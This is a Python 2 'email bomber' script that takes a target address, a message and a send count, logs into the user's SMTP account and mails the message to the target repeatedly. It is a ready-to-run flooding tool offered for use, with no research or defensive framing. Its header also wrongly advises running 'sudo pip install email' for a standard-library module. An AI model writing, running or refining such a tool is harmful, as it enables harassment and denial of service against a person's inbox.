#If you don't have email.mime.text installed use: 'sudo pip install email' to install it to make the program work
import smtplib
from email.mime.text import MIMEText

print "                                                                                                                                    "
                                                                                                                                    
print "BBBBBBBBBBBBBBBBB        OOOOOOOOO     MMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   EEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR   "
print "B::::::::::::::::B     OO:::::::::OO   M:::::::M             M:::::::MB::::::::::::::::B  E::::::::::::::::::::ER::::::::::::::::R  "
print "B::::::BBBBBB:::::B  OO:::::::::::::OO M::::::::M           M::::::::MB::::::BBBBBB:::::B E::::::::::::::::::::ER::::::RRRRRR:::::R "
print "BB:::::B     B:::::BO:::::::OOO:::::::OM:::::::::M         M:::::::::MBB:::::B     B:::::BEE::::::EEEEEEEEE::::ERR:::::R     R:::::R"
print "  B::::B     B:::::BO::::::O   O::::::OM::::::::::M       M::::::::::M  B::::B     B:::::B  E:::::E       EEEEEE  R::::R     R:::::R"
print "  B::::B     B:::::BO:::::O     O:::::OM:::::::::::M     M:::::::::::M  B::::B     B:::::B  E:::::E               R::::R     R:::::R"
print "  B::::BBBBBB:::::B O:::::O     O:::::OM:::::::M::::M   M::::M:::::::M  B::::BBBBBB:::::B   E::::::EEEEEEEEEE     R::::RRRRRR:::::R "
print "  B:::::::::::::BB  O:::::O     O:::::OM::::::M M::::M M::::M M::::::M  B:::::::::::::BB    E:::::::::::::::E     R:::::::::::::RR  "
print "  B::::BBBBBB:::::B O:::::O     O:::::OM::::::M  M::::M::::M  M::::::M  B::::BBBBBB:::::B   E:::::::::::::::E     R::::RRRRRR:::::R "
print "  B::::B     B:::::BO:::::O     O:::::OM::::::M   M:::::::M   M::::::M  B::::B     B:::::B  E::::::EEEEEEEEEE     R::::R     R:::::R"
print "  B::::B     B:::::BO:::::O     O:::::OM::::::M    M:::::M    M::::::M  B::::B     B:::::B  E:::::E               R::::R     R:::::R"
print "  B::::B     B:::::BO::::::O   O::::::OM::::::M     MMMMM     M::::::M  B::::B     B:::::B  E:::::E       EEEEEE  R::::R     R:::::R"
print "BB:::::BBBBBB::::::BO:::::::OOO:::::::OM::::::M               M::::::MBB:::::BBBBBB::::::BEE::::::EEEEEEEE:::::ERR:::::R     R:::::R"
print "B:::::::::::::::::B  OO:::::::::::::OO M::::::M               M::::::MB:::::::::::::::::B E::::::::::::::::::::ER::::::R     R:::::R"
print "B::::::::::::::::B     OO:::::::::OO   M::::::M               M::::::MB::::::::::::::::B  E::::::::::::::::::::ER::::::R     R:::::R"
print "BBBBBBBBBBBBBBBBB        OOOOOOOOO     MMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   EEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR"
                                                                                                                                    
print " "
print "Github: https://github.com/alpha-security"
print " "

number_to_send = raw_input("Enter the number of emails you want to send: ")
target = raw_input("Targets Email: ")
smtp_server = raw_input("SMTP server you want to use to send the mails: ")
smtp_port = input("Enter the port your smtp server runs on: ")
mail_to_use = raw_input("Enter your email: ")
mail_password = raw_input("Enter your mails password: ")
message = raw_input("Enter the message you want to send to the target: ")

def SendNotif(msg,smtp_server1,smtp_port1,mail_to_use1,mail_password1,target1):
    msg = MIMEText(msg)
    mail = smtplib.SMTP(smtp_server,smtp_port)
    mail.ehlo()
    mail.starttls()
    mail.login(mail_to_use,mail_password)
    mail.sendmail(mail_to_use,target1,msg.as_string())
    mail.close()

print " "
print "[*] Starting the bomber..."
print " "

for func in range(int(number_to_send)):
    SendNotif(message,smtp_server,smtp_port,mail_to_use,mail_password,target)
    print "[+] Successfully sent Email! Emails sent so far: ",func + 1
